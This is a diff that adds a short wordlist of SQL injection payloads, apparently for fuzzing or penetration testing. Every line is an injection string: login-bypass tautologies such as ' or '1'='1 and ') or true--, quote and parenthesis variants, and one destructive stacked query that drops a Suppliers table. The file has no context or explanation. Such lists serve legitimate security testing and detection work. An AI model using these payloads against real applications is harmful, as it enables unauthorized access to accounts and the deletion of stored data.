@@ -1,0 +1,26 @@
+'OR''='
+'a OR 1=1 --
+105 OR 1=1
+105; DROP TABLE Suppliers
+' or ' 1=1
+' or '1'='1
+1' or 1=1 -- -
+' or 1='1
+' or '1'='1
+Select id from users where username=’username’ and password=’password’ or 1=1--+
+') or true--
+') or ('')=('
+') or 1--
+') or ('x')=('
+" or true--
+" or ""="
+" or 1--
+" or "x"="
+") or true--
+") or ("")=("
+") or 1--
+") or ("x")=("
+')) or true--
+')) or ((''))=(('
+')) or 1--
+')) or (('x'))=(('
